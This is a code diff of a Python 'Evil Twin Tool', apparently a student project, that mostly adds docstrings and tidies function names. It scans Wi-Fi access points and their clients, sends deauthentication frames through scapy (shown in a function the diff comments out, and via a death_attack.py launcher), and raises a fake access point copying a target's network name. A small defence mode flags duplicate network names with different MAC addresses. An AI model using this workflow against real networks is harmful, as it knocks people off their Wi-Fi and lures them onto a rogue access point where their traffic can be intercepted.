@@ -1,11 +1,11 @@
 import os
 import sys
 from scapy.all import *
-from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt, Dot11ProbeReq, RadioTap, Dot11Deauth
+from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt,  RadioTap, Dot11Deauth
 
 # ---- magic numbers ----------
-ADDR = 0
-ESSID = 0
+# ADDR = 0
+# ESSID = 0
 NAME = 0
 MAC_ADDR = 1
 CHANNEL = 2
@@ -17,7 +17,6 @@ O = '\033[33m'  # orange
 C = '\033[36m'  # cyan
 
 # ------ Global variable -----
-
 sniffer_interface = ''
 ap_interface = ''
 target_mac = ''
@@ -28,14 +27,24 @@ mac_address_set = set()
 start_scan = datetime.now()
 
 
-def reset_interface():
-
+def reset_interface() -> None:
+    """
+    This function prepare the system to attack - it's shut down all the running network processes
+    it's should prevent system conflicts and error
+    :return: None
+    """
     # do_command(f"dhclient -v {sniffer_interface}")
     do_command('service NetworkManager stop')
     do_command('airmon-ng check kill')
 
 
-def print_msg(str, take_break: bool = True):
+def print_msg(str, take_break: bool = True) -> None:
+    """
+    This function make a nice print to the terminak
+    :param str: the msg we want to display
+    :param take_break: indication if want to stop the process after the msg or not
+    :return: None - Just print
+    """
     print("\n############################################################ \n")
     print("\t\t " + str + "\n")
     print("############################################################ \n")
@@ -43,34 +52,41 @@ def print_msg(str, take_break: bool = True):
         empty = input("Press Enter to continue...\n")
 
 
-def do_command(str, to_print: bool = True):
+def do_command(str, to_print: bool = True) -> None:
+    """
+    This function get a bash command  (as string) and execute it.
+    :param str: the command
+    :param to_print: indication if want to display it to the screes
+    :return: None
+    """
     print(C)
     if to_print:
         print(C + "command: " + str + W)
     os.system(str)
 
 
-def monitor_mode(interface: str):
+def monitor_mode(interface: str) -> None:
     """
-    This function change interface mode to monitor by user request
-    :return:
+    This function change the giveen interface mode to monitor
+    :param interface:  string - represent the network adapter to configure
+    :return: None
     """
     do_command('ifconfig ' + interface + ' down')
     do_command('iwconfig ' + interface + ' mode monitor')
     do_command('ifconfig ' + interface + ' up')
 
 
-def prepare_et_attack():
+def prepare_et_attack() -> None:
     """
-
-    :return:
+    configure the interfaces jobs for EVIL TWIN ATTACK
+    :return: None
     """
     global sniffer_interface
     global ap_interface
 
     reset_interface()
 
-    # set one inerface to be monitor
+    # set one interface to be monitor
     do_command('iwconfig')
     sniffer_interface = 'wlan0'
     user_input = input("Please type the interface name you want to put in 'monitor mode'\n"
@@ -89,39 +105,44 @@ def prepare_et_attack():
     print(f"Fake AP will use {ap_interface}")
 
 
-def prepare_defence():
+# def prepare_defence():
+#     """
+#
+#     :return:
+#     """
+#     global sniffer_interface
+#     global ap_interface
+#
+#     reset_interface()
+#
+#     # set one inerface to be monitor
+#     do_command('iwconfig')
+#     sniffer_interface = 'wlan0'
+#     user_input = input("Please type the interface name you want to put in 'monitor mode'\n"
+#                        "hit enter for 'wlan0'\n")
+#     if user_input != '':
+#         sniffer_interface = user_input
+#     monitor_mode(sniffer_interface)
+#
+#     # get interface to manage the fake AP
+#     do_command('iwconfig')
+#     ap_interface = 'wlan1'
+#     user_input = input("Please type the interface name you want to use for fake AP\n"
+#                        "hit enter for 'wlan1'\n")
+#     if user_input != '':
+#         ap_interface = user_input
+
+
+def managed_mode(interface):
     """
-
-    :return:
+    This function change the given interface mode to managed
+    :param interface:  string - represent the network adapter to configure
+    :return: None
     """
-    global sniffer_interface
-    global ap_interface
-
-    reset_interface()
-
-    # set one inerface to be monitor
-    do_command('iwconfig')
-    sniffer_interface = 'wlan0'
-    user_input = input("Please type the interface name you want to put in 'monitor mode'\n"
-                       "hit enter for 'wlan0'\n")
-    if user_input != '':
-        sniffer_interface = user_input
-    monitor_mode(sniffer_interface)
-
-    # get interface to manage the fake AP
-    do_command('iwconfig')
-    ap_interface = 'wlan1'
-    user_input = input("Please type the interface name you want to use for fake AP\n"
-                       "hit enter for 'wlan1'\n")
-    if user_input != '':
-        ap_interface = user_input
-
-
-def managed_mode():
-    do_command('ifconfig ' + sniffer_interface + ' down')
-    do_command('iwconfig ' + sniffer_interface + ' mode managed')
-    do_command('ifconfig ' + sniffer_interface + ' up')
-    print("[**] - The interface: " + sniffer_interface + ", is now in Managed Mode. \nYou can check it here : \n")
+    do_command('ifconfig ' + interface + ' down')
+    do_command('iwconfig ' + interface + ' mode managed')
+    do_command('ifconfig ' + interface + ' up')
+    print("[**] - The interface: " + interface + ", is now in Managed Mode. \nYou can check it here : \n")
     do_command('iwconfig')
 
 
@@ -149,7 +170,14 @@ def set_channel(channel: int) -> None:
     do_command(f"iwconfig {sniffer_interface} channel {channel}")
 
 
-def scan_netwroks(pkt):
+def scan_networks(pkt):
+    """
+    It's a parameter to sniff() , for 'prn'
+    This function get packet check if it Beacon frame (look in readme), if it is, the function can take
+    the Network data, and keep it  in ap_list
+    :param pkt: type of IEEE 802.11
+    """
+
     if pkt.haslayer(Dot11Beacon):
         # extract the MAC address of the network
         mac = pkt[Dot11].addr2
@@ -166,6 +194,13 @@ def scan_netwroks(pkt):
 
 
 def only_clients(pkt):
+    """
+    It's a parameter to sniff() , for 'prn'
+    This function get packet  and use a global variable 'target_mac' which is the AP address mac.
+    It's analyze if the packet contain data about the client which connect to this AP, and if it is,
+    The fucntion keep it in 'client_list'
+    :param pkt: type of IEEE 802.11
+    """
     global client_list
     if (pkt.addr2 == target_mac or pkt.addr3 == target_mac) and \
             pkt.addr1 != "ff:ff:ff:ff:ff:ff":
@@ -175,8 +210,14 @@ def only_clients(pkt):
                 print("Client mac:", pkt.addr1)
 
 
-# def scan_clients(rmac, addr):
 def scan_clients(AP_id: int):
+    """
+    This function get an index for AP in ap_list
+    and sniff all the packets that pass between the clients and the AP, with limit time
+    we the time scan is over it display all the client who connected to this AP
+    Note: This function change the listening channel using threads
+    :param AP_id: int - index in ap_list
+    """
     global target_mac
     global start_scan
     global search_timeout
@@ -220,11 +261,21 @@ def scan_clients(AP_id: int):
 
 
 def duplicates_network_name(lst, item):
+    """
+    helper function to extract only the mac address from ap_list
+    :param lst: 2D array
+    :param item: to find and extract
+    :return:
+    """
     global ap_list
     return [ap_list[i][1] for i, x in enumerate(lst) if x == item]
 
 
 def defence_APs_scanner() :
+    """
+    THis function scan the AP around and by sniffing there packets , keep there data, and check if
+    has a duplicate network name with different mac address, if it is it's alert about option of ET attack
+    """
     global search_timeout
     global start_scan
     user_input = input("Please enter the scanning time frame in seconds\n"
@@ -238,7 +289,7 @@ def defence_APs_scanner() :
     channel_changer.start()
     print("\n Scanning for networks...\n")
     try:
-        sniff(iface=sniffer_interface, prn=scan_netwroks, timeout=search_timeout)
+        sniff(iface=sniffer_interface, prn=scan_networks, timeout=search_timeout)
     except UnicodeDecodeError as e:
         print('Exception:', e)
         pass
@@ -280,6 +331,14 @@ def defence_APs_scanner() :
 
 
 def APs_scanner() -> int:
+    """
+    This function get an index for AP in ap_list
+    and sniff all the packets that pass between the clients and the AP, with limit time
+    we the time scan is over it display all the client who connected to this AP
+    Note: This function change the listening channel using threads
+    :param AP_id: int - index in ap_list
+    :return:
+    """
     global search_timeout
     global start_scan
     user_input = input("Please enter the scanning time frame in seconds\n"
@@ -293,7 +352,7 @@ def APs_scanner() -> int:
     channel_changer.start()
     print("\n Scanning for networks...\n")
     try:
-        sniff(iface=sniffer_interface, prn=scan_netwroks, timeout=search_timeout)
+        sniff(iface=sniffer_interface, prn=scan_networks, timeout=search_timeout)
     except UnicodeDecodeError as e:
         print('Exception:', e)
         pass
@@ -303,7 +362,7 @@ def APs_scanner() -> int:
     if num > 0:  # has available networks
         print("\n*************** APs Table ***************\n")
         for x in range(num):
-            print('[', str(x), ']', ap_list[x][ADDR], ap_list[x][MAC_ADDR])
+            print('[', str(x), ']', ap_list[x][NAME], ap_list[x][MAC_ADDR])
 
         #        print("\n--------------------------------------------\n")
         print("\n************* FINISH SCANNING *************\n")
@@ -326,49 +385,61 @@ def APs_scanner() -> int:
             print("#  Goodbye  #")
             return -1
 
-
-def attack(client_idx: int):
-    # global ap_to_attack
-    print("attacking")
-    # 802.11 frame
-    # addr1: destination MAC
-    # addr2: source MAC
-    # addr3: Access Point MAC
-
-    client_mac = client_list[client_idx]
-    print("attaching client mac:", client_mac)
-    # print("clinet mac to attack:", client_mac )
-    # brdmac = "ff:ff:ff:ff:ff:ff"
-    # pkt = RadioTap() / Dot11(addr1 = brdmac , addr2 = client_mac , addr3 = client_mac)/ Dot11Deauth()
-    # sendp(pkt, iface=network_adapter , count=1000, inter = 0.2)
-
-    for y in range(1, 3):
-        # sending fake packets  in two directions : AP -> client , client -> AP
-        pkt1 = RadioTap() / Dot11(addr1=client_mac, addr2=target_mac, addr3=target_mac) / Dot11Deauth()
-        pkt2 = RadioTap() / Dot11(addr1=target_mac, addr2=client_mac, addr3=client_mac) / Dot11Deauth()
-        for _ in range(50):
-            print("sending death packets...")
-            sendp(pkt1, iface=sniffer_interface, count=20)
-            sendp(pkt2, iface=sniffer_interface, count=20)
-            if y % 30 == 0:
-                press = input("press p to stop, otherwise any")
-                if press == 'p':
-                    print("#  Goodbye  #")
-                    break
-
+#
+# def attack(client_idx: int):
+#     """
+#     This function build a fake disconnect packet called 'death authentication'
+#     by 802.11 frame foramt and send to client and to AP
+#     # addr1: destination MAC
+#     # addr2: source MAC
+#     # addr3: Access Point MAC
+#     :param client_idx: index in client list
+#     """
+#     # global ap_to_attack
+#     print("attacking")
+#
+#     client_mac = client_list[client_idx]
+#     print("attacking client mac:", client_mac)
+#
+#     for y in range(1, 3):
+#         # sending fake packets  in two directions : AP -> client , client -> AP
+#         pkt1 = RadioTap() / Dot11(addr1=client_mac, addr2=target_mac, addr3=target_mac) / Dot11Deauth()
+#         pkt2 = RadioTap() / Dot11(addr1=target_mac, addr2=client_mac, addr3=client_mac) / Dot11Deauth()
+#         for _ in range(50):
+#             print("sending death packets...")
+#             sendp(pkt1, iface=sniffer_interface, count=20)
+#             sendp(pkt2, iface=sniffer_interface, count=20)
+#             if y % 30 == 0:
+#                 press = input("press p to stop, otherwise any")
+#                 if press == 'p':
+#                     print("#  Goodbye  #")
+#                     break
+#
 
 def death_attack(client_mac: str):
+    """
+    This function excite the death_attack.py script for deauthentication client form AP
+    :param client_mac: the client to disconnect
+    """
     line = f"python3 death_attack.py {sniffer_interface} {target_mac} {client_mac}"
     gnome = f'gnome-terminal -- sh -c "{line}"'
     do_command(gnome)
 
 
 def ap_up(network_name: str):
+    """
+    This function excite the fake_ap.py script to fake AP
+    :param network_name: string - the name for the fake AP
+    """
     global ap_interface
     do_command("python3 fake_ap.py " + ap_interface + " " + network_name)
 
 
 def ap_up_gnome(network_name: str):
+    """
+    This function excite the fake_ap.py script to fake AP in new terminal
+    :param network_name: string - the name for the fake AP
+    """
     global ap_interface
     line = "python3 fake_ap.py " + ap_interface + " " + network_name
     gnome = f'gnome-terminal -- sh -c "{line}"'
@@ -376,6 +447,9 @@ def ap_up_gnome(network_name: str):
 
 
 def run_evil_twin():
+    """
+    The EVIL TWIN ATTACK manager
+    """
     # step 1 - prepare the newtwork adapter
     print_msg("Step 1 - Preparation")
     prepare_et_attack()
@@ -402,12 +476,12 @@ def run_evil_twin():
             else:
                 # step 5 - Back to managed mode
                 print_msg("Error - managed mode", False)
-                managed_mode()
+                managed_mode(sniffer_interface)
                 reset_interface()
         else:
             # step 5 - Back to managed mode
             print_msg("Error - managed mode", False)
-            managed_mode()
+            managed_mode(sniffer_interface)
 
 
 
@@ -429,6 +503,9 @@ def run_evil_twin():
 
 
 def prepare_fake_ap():
+    """
+    configure the interfaces to Fake AP
+    """
     global ap_interface
     reset_interface()
 
@@ -446,6 +523,9 @@ def prepare_fake_ap():
 
 
 def run_fake_up():
+    """
+    The fake AP manager
+    """
     print_msg("Step 1 - Preparation")
 
     prepare_fake_ap()
@@ -461,10 +541,13 @@ def run_fake_up():
 
 
 def run_defence():
+    """
+    defence manger
+    """
     # step 1 - prepare the newtwork adapter
     print_msg("Step 1 - Preparation")
+    prepare_et_attack()
 
-    prepare_defence()
     print_msg("Step 2 - Fake AP ")
     network = "HOTBOX2020"
     result = input("please enter the AP you wish to demonstrate on\n")
@@ -498,6 +581,9 @@ def run_defence():
 
 
 def welocme():
+    """
+    Land zone , allow to user which action to preform
+    """
     print_msg("Welcome To Evil Twin Tool", False)
     result = input("[1] Evil Twin Attack\n"
                    "[2] Fake access point\n"
